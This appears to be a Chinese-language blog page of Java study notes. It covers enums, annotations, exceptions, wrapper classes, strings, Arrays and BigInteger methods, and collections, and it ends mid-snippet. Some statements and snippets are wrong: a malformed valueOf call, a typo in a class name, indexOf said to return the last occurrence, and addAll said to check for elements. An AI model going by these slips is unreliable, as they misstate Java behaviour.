title="枚举类"></a>枚举类</h1><h2 id="自定义枚举类"><a href="#自定义枚举类" class="headerlink" title="自定义枚举类"></a>自定义枚举类</h2><ul><li>构造器私有化</li><li>public static final 修饰的属性</li><li>创建对象赋值给这些属性</li><li>定义 toString 方法</li></ul><h2 id="enum-类"><a href="#enum-类" class="headerlink" title="enum 类"></a>enum 类</h2><ul><li>关键字 enum 代替 class</li></ul><h2 id="使用关键字-enum-时，会变成-final-类，并且隐式继承-Enum-类"><a href="#使用关键字-enum-时，会变成-final-类，并且隐式继承-Enum-类" class="headerlink" title="使用关键字 enum 时，会变成 final 类，并且隐式继承 Enum 类"></a>使用关键字 enum 时，会变成 final 类，并且隐式继承 Enum 类</h2><ul><li>javap 反编译 class</li><li>不能被继承或再继承其他类，但是可以实现接口</li><li>使用 Enum 类相关方法</li></ul><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Season autumn=Season.AUTUMN;<br>//<span class="hljs-type">name</span>()返回枚举对象的名字<br><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(autumn.name());<br>//ordinal()返回枚举对象的次序/编号，从<span class="hljs-number">0</span>开始编号<br><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(autumn.ordinal());<br>//<span class="hljs-keyword">values</span>()返回定义的所有枚举对象<br>Season[] <span class="hljs-keyword">values</span>=Season.<span class="hljs-keyword">values</span>();<br>//valueOf()将字符串转换成枚举对象，字符串必须为已有的枚举对象名<br>Season autumn1=Season valueOf(&quot;AUTUMN&quot;);<br><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(Season.SUMMER.compareTo(SEason.AUTUMN));//两个值相减<br>//toString()<br></code></pre></td></tr></table></figure><h1 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h1><h2 id="Annotation"><a href="#Annotation" class="headerlink" title="Annotation"></a>Annotation</h2><p>retrofit2</p><h2 id="基本-Annotation"><a href="#基本-Annotation" class="headerlink" title="基本 Annotation"></a>基本 Annotation</h2><ul><li>@Override：验证方法为重写父类方法，只能用于方法</li><li>@Deprecated：用于表示某个元素（类&#x2F;方法等）已过时</li><li>@SuppressWarnings({“all”})：抑制编译器警告</li></ul><h2 id="注解类"><a href="#注解类" class="headerlink" title="注解类"></a>注解类</h2><ul><li>@Target（ElementType.METHOD），指定注解范围</li><li>@Target 修饰注解的注释，称为元注解</li><li>@interface 是注解类</li></ul><h1 id="try-catch"><a href="#try-catch" class="headerlink" title="try-catch"></a>try-catch</h1><p>try 包裹可能出现异常代码，catch 去捕获异常，try 出现异常，出现异常的代码后面不会执行</p><h1 id="throws-与-throw"><a href="#throws-与-throw" class="headerlink" title="throws 与 throw"></a>throws 与 throw</h1><p>抛出异常要与父类一致</p><p>throw: 后面跟异常对象</p><p>throws: 做异常处理方式，在方法中</p><h1 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h1><h2 id="包装类型和-String-类型的转换"><a href="#包装类型和-String-类型的转换" class="headerlink" title="包装类型和 String 类型的转换"></a>包装类型和 String 类型的转换</h2><p>a) 包装类型转 String 类型</p><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-built_in">Integer</span> i=<span class="hljs-number">10</span>;<br> <span class="hljs-built_in">String</span> s1=i.toString();<br> <span class="hljs-built_in">String</span> s2=<span class="hljs-built_in">String</span>.valueOf(i);<br> <span class="hljs-built_in">String</span> s3=i+<span class="hljs-string">&quot;&quot;</span>;<br> System.<span class="hljs-keyword">out</span>.println(s1);<br> System.<span class="hljs-keyword">out</span>.println(s2);<br> System.<span class="hljs-keyword">out</span>.println(s3);<br></code></pre></td></tr></table></figure><p>b）String 类型转包装类型</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-type">Integer</span> i1=<span class="hljs-built_in">new</span> <span class="hljs-type">Integer</span>(s1);<br>   <span class="hljs-type">Integer</span> i2=<span class="hljs-type">Integer</span>.valueOf(s2);<br>   <span class="hljs-type">Integer</span> i3=<span class="hljs-type">Integer</span>.parseInt(s3);<br>   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(i1);<br>   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(i2);<br>   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(i3);<br></code></pre></td></tr></table></figure><p>c）例子</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Object</span> obj1=<span class="hljs-keyword">true</span>?<span class="hljs-built_in">new</span> <span class="hljs-type">Integer</span>(<span class="hljs-number">1</span>):<span class="hljs-built_in">new</span> <span class="hljs-type">Double</span>(<span class="hljs-number">2.0</span>);//三元条件运算符是一个整体<br>   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(obj1);//<span class="hljs-number">1.0</span><br><br><span class="hljs-keyword">Object</span> obj2;<br>   <span class="hljs-keyword">if</span>(<span class="hljs-keyword">true</span>)&#123;<br>       obj2=<span class="hljs-built_in">new</span> <span class="hljs-type">Integer</span>(<span class="hljs-number">1</span>);<br>   &#125;<span class="hljs-keyword">else</span> &#123;<br>       obj2=<span class="hljs-built_in">new</span> <span class="hljs-type">Double</span>(<span class="hljs-number">2.0</span>);<br>   &#125;<br>   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(obj2);//<span class="hljs-number">1</span><br><br><br><span class="hljs-type">Integer</span> i=<span class="hljs-built_in">new</span> <span class="hljs-type">Integer</span>(<span class="hljs-number">1</span>);<br>   <span class="hljs-type">Integer</span> j=<span class="hljs-built_in">new</span> <span class="hljs-type">Integer</span>(<span class="hljs-number">1</span>);<br>   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(i==j);  //<span class="hljs-keyword">false</span><br>   <br>   <span class="hljs-type">Integer</span> m=<span class="hljs-number">1</span>;<br>   <span class="hljs-type">Integer</span> n=<span class="hljs-number">1</span>;<br>   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(m==n);//<span class="hljs-keyword">True</span>,指向同一个对象<br>   <br>   <span class="hljs-type">Integer</span> x=<span class="hljs-number">128</span>;<br>   <span class="hljs-type">Integer</span> y=<span class="hljs-number">128</span>;<br>   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(x==y);//<span class="hljs-keyword">False</span>超过范围，通过<span class="hljs-built_in">new</span>去创建，不等<br>   <br>   <span class="hljs-type">Integer</span> a=<span class="hljs-number">128</span>;<br>   <span class="hljs-type">int</span> b=<span class="hljs-number">128</span>;<br>   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(a==b);//<span class="hljs-keyword">True</span>,存在基本数据类型，比较的是值<br><br></code></pre></td></tr></table></figure><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><ul><li>final 类，不能被继承</li><li>直接赋值，调用构造器</li><li>属性 private final char value[ ];存放字符串内容</li></ul><h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h2><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">String</span> a=<span class="hljs-string">&quot;abcd&quot;</span>;<span class="hljs-comment">//指向常量池</span><br><span class="hljs-built_in">String</span> b=<span class="hljs-literal">new</span> <span class="hljs-built_in">String</span>(<span class="hljs-string">&quot;abcd&quot;</span>);<span class="hljs-comment">//指向对象，对象指向常量池</span><br>System.out.println(a.<span class="hljs-keyword">equals</span>(b)); <span class="hljs-comment">//True</span><br>System.out.println(a==b);<span class="hljs-comment">//False</span><br></code></pre></td></tr></table></figure><h2 id="常量池字符串"><a href="#常量池字符串" class="headerlink" title="常量池字符串"></a>常量池字符串</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">String</span> s1=<span class="hljs-string">&quot;hello&quot;</span>+<span class="hljs-string">&quot;java&quot;</span>;<br><span class="hljs-comment">//hellojava</span><br></code></pre></td></tr></table></figure><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-built_in">String</span> a=<span class="hljs-string">&quot;hell&quot;</span>;<br><span class="hljs-built_in">String</span> b=<span class="hljs-string">&quot;jab&quot;</span>;<br><span class="hljs-built_in">String</span> c=a+b;//<span class="hljs-keyword">new</span> 了一个对象<br><span class="hljs-built_in">String</span> d=<span class="hljs-string">&quot;helljab&quot;</span>;<br>System.<span class="hljs-keyword">out</span>.println(c==d);<br>//<span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-built_in">String</span> <span class="hljs-built_in">str</span>=<span class="hljs-keyword">new </span><span class="hljs-class title_">String</span>(<span class="hljs-string">&quot;abc&quot;</span>);<br>     <span class="hljs-keyword">final</span> <span class="hljs-type">char</span>[] ch=&#123;<span class="hljs-string">&#x27;j&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;v&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>&#125;;<br>     <span class="hljs-title function_">change</span>(<span class="hljs-built_in">str</span>,ch);<br>     System.<span class="hljs-property">out</span>.<span class="hljs-property">println</span>(<span class="hljs-built_in">str</span>);<br>     System.<span class="hljs-property">out</span>.<span class="hljs-property">println</span>(ch);<br> &#125;<br> <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">change</span>(<span class="hljs-built_in">String</span> <span class="hljs-built_in">str</span>,<span class="hljs-type">char</span> ch[])&#123;<br>     <span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;java&quot;</span>;<br>     ch[<span class="hljs-number">0</span>]=<span class="hljs-string">&#x27;a&#x27;</span>;<br> &#125;<br> <br> <span class="hljs-comment">//aava</span><br></code></pre></td></tr></table></figure><h1 id="字符串编码"><a href="#字符串编码" class="headerlink" title="字符串编码"></a>字符串编码</h1><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-built_in">String</span> name=<span class="hljs-string">&quot;我虽然&quot;</span>;<br><span class="hljs-built_in">String</span> ISO_s=<span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(name.getBytes(StandardCharsets.UTF_8),StandardCharsets.ISO_8859_1);<br>System.<span class="hljs-keyword">out</span>.println(ISO_s);<br><span class="hljs-built_in">String</span> UTF8_s= <span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>(ISO_s.getBytes(StandardCharsets.ISO_8859_1),StandardCharsets.UTF_8);<br> System.<span class="hljs-keyword">out</span>.println(UTF8_s);<br></code></pre></td></tr></table></figure><h1 id="StringBuffer"><a href="#StringBuffer" class="headerlink" title="StringBuffer"></a>StringBuffer</h1><h2 id="特性-1"><a href="#特性-1" class="headerlink" title="特性"></a>特性</h2><ul><li>不能被继承</li><li>父类是 AbstractStringBuilder</li><li>AbstractStringBuilder 有属性 char[] value,存放在堆中</li></ul><h2 id="StingBuffer-和-String-的转换"><a href="#StingBuffer-和-String-的转换" class="headerlink" title="StingBuffer 和 String 的转换"></a>StingBuffer 和 String 的转换</h2><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs abnf">StringBuffer stringBuffer<span class="hljs-operator">=</span>new StringBuffer(<span class="hljs-string">&quot;abcd&quot;</span>)<span class="hljs-comment">;</span><br><span class="hljs-attribute">stringBuffer</span><span class="hljs-operator">=</span>stringBuffer.append(<span class="hljs-string">&quot;ac&quot;</span>)<br>String s<span class="hljs-operator">=</span>stringBuffer.toString()<span class="hljs-comment">;</span><br>String ss<span class="hljs-operator">=</span>new String(stringBuffer)<span class="hljs-comment">;</span><br>System.out.println(s)<span class="hljs-comment">;</span><br>//abcdac<br></code></pre></td></tr></table></figure><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><p>append，toString</p><h2 id="String、StringBuffer、StringBuider"><a href="#String、StringBuffer、StringBuider" class="headerlink" title="String、StringBuffer、StringBuider"></a>String、StringBuffer、StringBuider</h2><p>StringBuider 效率最高，拼接字符串</p><h2 id="Arrays"><a href="#Arrays" class="headerlink" title="Arrays"></a>Arrays</h2><p> sort 方法</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Person abc=<span class="hljs-built_in">new</span> Person(&quot;abc&quot;,<span class="hljs-number">30</span>);<br>        Person umr=<span class="hljs-built_in">new</span> Person(&quot;umr&quot;,<span class="hljs-number">23</span>);<br>        Person acd=<span class="hljs-built_in">new</span> Person(&quot;acd&quot;,<span class="hljs-number">40</span>);<br>        Person[] aaa=<span class="hljs-built_in">new</span> Person[]&#123;abc,umr,acd&#125;;<br>        Arrays.sort(aaa, <span class="hljs-built_in">new</span> Comparator() &#123;<br>           @Override<br>            <span class="hljs-built_in">public</span> <span class="hljs-type">int</span> compare(<span class="hljs-keyword">Object</span> o1, <span class="hljs-keyword">Object</span> o2) &#123;<br>                <span class="hljs-type">int</span> i = ((Person)o1) .age -((Person)o2).age;<br>                <span class="hljs-keyword">return</span> i;<br>            &#125;<br>        &#125;);<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(Arrays.toString(aaa));<br>    &#125;<br>&#125;<br><span class="hljs-keyword">class</span> Person&#123;<br>        String <span class="hljs-type">name</span>=<span class="hljs-keyword">null</span>;<br>        <span class="hljs-built_in">public</span> <span class="hljs-type">int</span> age=<span class="hljs-number">0</span>;<br>        <span class="hljs-built_in">public</span> Person(String <span class="hljs-type">name</span>,<span class="hljs-type">int</span> age)&#123;<br>            this.name=<span class="hljs-type">name</span>;<br>            this.age=age;<br>        &#125;<br>        <br>        @Override<br>        <span class="hljs-built_in">public</span> String toString() &#123;<br>            <span class="hljs-keyword">return</span> &quot;Person&#123;&quot; +<br>                    &quot;name=&#x27;&quot; + <span class="hljs-type">name</span> + <span class="hljs-string">&#x27;\&#x27;&#x27; +</span><br><span class="hljs-string">                    &quot;, age=&quot; + age +</span><br><span class="hljs-string">                    &#x27;</span>&#125;<span class="hljs-string">&#x27;;</span><br><span class="hljs-string">        &#125;</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string">    </span><br><span class="hljs-string">    //[Person&#123;name=&#x27;</span>umr<span class="hljs-string">&#x27;, age=23&#125;, Person&#123;name=&#x27;</span>abc<span class="hljs-string">&#x27;, age=30&#125;, Person&#123;name=&#x27;</span>acd<span class="hljs-string">&#x27;, age=40&#125;]</span><br></code></pre></td></tr></table></figure><h2 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h2><p>Arrays.toString  返回数组的字符串形式</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-type">Integer</span>[] aa = <span class="hljs-built_in">new</span> <span class="hljs-type">Integer</span>[]&#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;;<br>   Arrays.sort(aa, <span class="hljs-built_in">new</span> Comparator() &#123;<br>           @Override<br>           <span class="hljs-built_in">public</span> <span class="hljs-type">int</span> compare(<span class="hljs-keyword">Object</span> o1, <span class="hljs-keyword">Object</span> o2) &#123;<br>               <span class="hljs-type">int</span> i = (<span class="hljs-type">Integer</span>) o1 - (<span class="hljs-type">Integer</span>) o2;<br>               <span class="hljs-keyword">return</span> i;<br>           &#125;<br>       &#125;);<br>   <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(Arrays.toString(aa));<br>   //[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]<br></code></pre></td></tr></table></figure><p>Arrays.sort 自然排序和定制排序（数值排序、对象排序）</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">参考前面的 <span class="hljs-built_in">sort</span> 方法例子<br></code></pre></td></tr></table></figure><p>Arrays.copyOf  数组元素的复制</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span>[] aa=new int[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br>   <span class="hljs-attribute">int</span>[] bb=Arrays.copyOf(aa,aa.length);<br>   <span class="hljs-attribute">bb</span>[<span class="hljs-number">0</span>]=<span class="hljs-number">1</span>;<br>   <span class="hljs-attribute">System</span>.out.println(Arrays.toString(bb));<br></code></pre></td></tr></table></figure><p> Arrays.aslist 数组转化为 List 集合</p><p>Arrays.fill  数组填充</p><p>Arrays.binarySearch 二分查找（有序数组）</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br><span class="hljs-keyword">int</span> i = Arrays.binarySearch(aa,<span class="hljs-number">11</span>);<br>        System.out.<span class="hljs-keyword">println</span>(i);<br><span class="hljs-comment">// 10</span><br>前提：有序情况下<br><br>无序时，先排序<br><span class="hljs-keyword">int</span>[] aa=<span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[]&#123;<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>&#125;;<br>Arrays.<span class="hljs-keyword">sort</span>(aa);<br>    System.out.<span class="hljs-keyword">println</span>(Arrays.toString(aa));<br>    <span class="hljs-keyword">int</span> i = Arrays.binarySearch(aa,<span class="hljs-number">2</span>);<br>    System.out.<span class="hljs-keyword">println</span>(i);<br><span class="hljs-comment">//[0, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 13, 14]</span><br><span class="hljs-comment">//2</span><br><br>找不到就返回负数，-(low+<span class="hljs-number">1</span>)，low 为原本出现的位置，比如查找 <span class="hljs-number">10</span>，返回 -<span class="hljs-number">11</span> <br></code></pre></td></tr></table></figure><p>System.arraycopy   复制数组</p><p>System. currentTimeMillens( )返回当前距离时间</p><h2 id="BigInteger"><a href="#BigInteger" class="headerlink" title="BigInteger"></a>BigInteger</h2><p>保存比较大的数</p><p>BigDecimal  保存精度更高的小数</p><ul><li>add  加</li><li>subtract 减</li><li>multiply 乘</li><li>divide 除</li></ul><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs abnf">BigInteger bigInteger1<span class="hljs-operator">=</span>new BigInteger(<span class="hljs-string">&quot;111111111111111111111111111111111111111&quot;</span>)<span class="hljs-comment">;</span><br>BigInteger bigInteger2<span class="hljs-operator">=</span>new BigInteger(<span class="hljs-string">&quot;100&quot;</span>)<span class="hljs-comment">;</span><br><br>BigInteger add<span class="hljs-operator">=</span>bigInteger1.add(bigInteger2)<span class="hljs-comment">;</span><br>System.out.println(add)<span class="hljs-comment">;</span><br><br>BigInteger subtract<span class="hljs-operator">=</span>bigInteger1.subtract(bigInteger2)<span class="hljs-comment">;</span><br>System.out.println(subtract)<span class="hljs-comment">;</span><br><br>BigInteger multiply<span class="hljs-operator">=</span>bigInteger1.multiply(bigInteger2)<span class="hljs-comment">;</span><br>System.out.println(multiply)<span class="hljs-comment">;</span><br><br>BigInteger divide<span class="hljs-operator">=</span>bigInteger1.divide(bigInteger2)<span class="hljs-comment">;</span><br>System.out.println(divide)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h1 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h1><h2 id="集合框架体系"><a href="#集合框架体系" class="headerlink" title="集合框架体系"></a>集合框架体系</h2><ul><li>主要是两组 Collection 和 Map （单列集合，双列集合）</li><li>Collection 接口有两个子接口 List、Set，其实现子类都是单列集合</li><li>Map 接口的实现子类是双列集合，存放的 K-V</li></ul><h2 id="Collection-接口"><a href="#Collection-接口" class="headerlink" title="Collection 接口"></a>Collection 接口</h2><ul><li><p>add 添加单个元素，都是Object ，基本数据类型加入的是包装类型</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Collection <span class="hljs-attribute">collection</span>=new ArrayList();<br>  collection.<span class="hljs-built_in">add</span>(100);<br>  collection.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;java&quot;</span>);<br>  collection.<span class="hljs-built_in">add</span>(<span class="hljs-literal">false</span>);<br>  collection.<span class="hljs-built_in">add</span>(<span class="hljs-literal">null</span>);<br>  System.out.println(collection);<br></code></pre></td></tr></table></figure></li><li><p>remove 删除指定元素，List 的子类有重载，可以按 index 删除</p></li><li><p>contains 查找元素是否存在</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xquery">collection<span class="hljs-built_in">.contains</span><span class="hljs-built_in">(false</span>);<br>   System.out.println<span class="hljs-built_in">(collection</span><span class="hljs-built_in">.contains</span><span class="hljs-built_in">(false</span>));<br></code></pre></td></tr></table></figure></li><li><p>size 获取元素个数</p></li><li><p>isEmpty 判断是否为空</p></li><li><p>clear 清空</p></li><li><p>addAll 查找多个元素是否存在</p></li><li><p>removeAll 删除多个元素</p></li></ul><h2 id="List"><a href="#List" class="headerlink" title="List"></a>List</h2><ul><li>有序，可重复</li><li>void add ( int index,Object ele ) 在 index 位置插入 ele 元素</li><li>boolean addAll ( int index,Collection eles) 从 index 位置开始将 eles 中的所有元素添加进来</li><li>Object get ( int index) 获取指定 index 位置的元素</li><li>int indexOf（Object obj)返回 obj 在当前集合中最后一次出现的位置</li><li>Object remove ( int index) 移除指定 index 位置的元素，并返回此元素</li><li>Object set （ int index,Object ele )  设置指定 index 位置的元素为 ele，相当于替换</li><li>List sublist ( int fromIndex,int toIndex)  返回从 fromIndex 到 toIndex 位置的子集合</li></ul><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs csharp">List list =<span class="hljs-keyword">new</span> ArrayList();<br>   list.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;javass&quot;</span>);<br>   list.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;urm&quot;</span>);<br>   list.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;rr&quot;</span>);<br>   list.<span class="hljs-keyword">add</span>(<span class="hljs-number">2</span>,<span class="hljs-string">&quot;java&quot;</span>);<br>       <br>   List list2=<span class="hljs-keyword">new</span> ArrayList();<br>   list2.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;javass2&quot;</span>);<br>   list2.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;urm2&quot;</span>);<br>   list2.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;rr2&quot;</span>);<br>   list.addAll(<span class="hljs-number">1</span>,list2);<br>   list.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;urm2&quot;</span>);<br>   list.<span class="hljs-keyword">add</span>(<span class="hljs-string">&quot;urm&quot;</span>);<br>       <br>   System.<span class="hljs-keyword">out</span>.println(list.<span class="hljs-keyword">get</span>(<span class="hljs-number">4</span>));    <span class="hljs-comment">//urm</span><br>       <br>   System.<span class="hljs-keyword">out</span>.println(list.indexOf(<span class="hljs-string">&quot;urm2&quot;</span>));       <span class="hljs-comment">//2</span><br>       <br>   System.<span class="hljs-keyword">out</span>.println(list.lastIndexOf(<span class="hljs-string">&quot;urm&quot;</span>));        <span class="hljs-comment">//8</span><br>   list.<span class="hljs-keyword">remove</span>(<span class="hljs-number">8</span>);<br>   list.<span class="hljs-keyword">set</span>(<span class="hljs-number">7</span>,<span class="hljs-string">&quot;urm4&quot;</span>);<br>   System.<span class="hljs-keyword">out</span>.println(list.subList(<span 